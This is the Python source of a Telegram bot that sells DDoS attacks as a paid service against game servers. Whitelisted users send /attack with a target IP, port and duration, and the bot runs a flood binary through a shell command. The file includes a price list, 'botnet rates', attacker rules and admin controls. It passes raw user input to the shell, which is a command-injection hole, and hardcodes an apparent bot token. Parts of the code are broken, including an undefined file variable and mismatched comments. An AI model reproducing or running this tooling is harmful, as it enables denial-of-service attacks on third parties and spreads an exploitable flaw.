import telebot
import subprocess
import requests
import datetime
import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton


# insert your Telegram bot token here
bot = telebot.TeleBot('7942245713:AAHPlmW9LmtnyaAUnNoj0IeLclWmgI9qlco')

# Admin user IDs
admin_id = ["5993665056"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def get_inline_keyboard():
    keyboard = InlineKeyboardMarkup()
        
    return keyboard


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response, reply_markup=get_inline_keyboard())



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response, reply_markup=get_inline_keyboard())


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response, reply_markup=get_inline_keyboard())
        else:
            response = "No data found"
            bot.reply_to(message, response, reply_markup=get_inline_keyboard())
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response, reply_markup=get_inline_keyboard())


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 {username} 💎\n\n🟢 𝐘𝐎𝐔𝐑 A𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🟢\n\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PRIVATE \n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n⏸️ 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐈𝐧 {time} 𝐖𝐚𝐢𝐭 𝐓𝐡𝐞𝐫𝐞 𝐖𝐢𝐭𝐡𝐨𝐮𝐭 𝐓𝐨𝐮𝐜𝐡𝐢𝐧𝐠 𝐀𝐧𝐲 𝐁𝐮𝐭𝐭𝐨𝐧 \n\nSEND FEEDBACK TO VIP\nNO FEEDBACK YOUR ATTACK WILL BE BLOCKED BY  MODS"
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

# Dictionary to store the last time each user ran the / command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown. Please Wait 150 sec Before Running The /attack Command Again buy premium instant attack with zero sec dm VIP."
                bot.reply_to(message, response, reply_markup=get_inline_keyboard())
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 200:
                response = "Error: Time interval must be less than 90."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 900"
                subprocess.run(full_command, shell=True)
                response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PREMIUM\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧 𝐂𝐡𝐚𝐭 𝐆𝐫𝐨𝐮𝐩 AND TO SUKUNAA_XD"
        else:
            response = "⚠️ Iɴᴠᴀʟɪᴅ Fᴏʀᴍᴀᴛ ⚠️\n\n✅ Usᴀɢᴇ : /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴅᴜʀᴀᴛɪᴏɴ>\n\n✅ Fᴏʀ Exᴀᴍᴘʟᴇ: /attack 127.0.0.1 8700 200"
    else:
        response = "💢 dm to buy paid 💢\n\n DM VIP DEDOS to 🗝️"

    bot.reply_to(message, response, reply_markup=get_inline_keyboard())



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response, reply_markup=get_inline_keyboard())


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /attack : Method For Bgmi Servers. 
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 By  BOT
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text, reply_markup=get_inline_keyboard())

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy SUKUNAA_XD BOT SUKUNAA_XD"
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
By @SUKUNAA_XD BOT'''
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐏𝐋𝐀𝐍 𝐃𝐄𝐊𝐇𝐄𝐆𝐀 𝐓𝐔 𝐆𝐀𝐑𝐄𝐄𝐁 😂:

🌟✨ <b>@SUKUNAA_XD Package Details</b> ✨🌟

🕒 <b>Attack Time:</b> 280 seconds  
⏳ <b>After Attack Limit:</b> 0 seconds  
⚔️ <b>Concurrent Attacks:</b> 3  

---

💰 <b>𝐓𝐄𝐑𝐈 𝐀𝐔𝐊𝐀𝐃 𝐒𝐄 𝐁𝐀𝐇𝐀𝐑 💸</b>  
✨ <b>1 Day:</b> 200 💵  
✨ <b>3 Days:</b> 450 💵  
✨ <b>1 Week:</b> 800 💵  
✨ <b>2 Weeks:</b> 1200 💵  
✨ <b>1 Month:</b> 1700 💵  

---

🚀 <b>Join Us for More!</b>  
📩 <a href="SUKUNAA_XD">Contact Owner</a> 💥
'''

    bot.reply_to(message, response, parse_mode='HTML', reply_markup=get_inline_keyboard())

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
By @SUKUNAA_XD BOT
'''
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response, reply_markup=get_inline_keyboard())




bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

#By @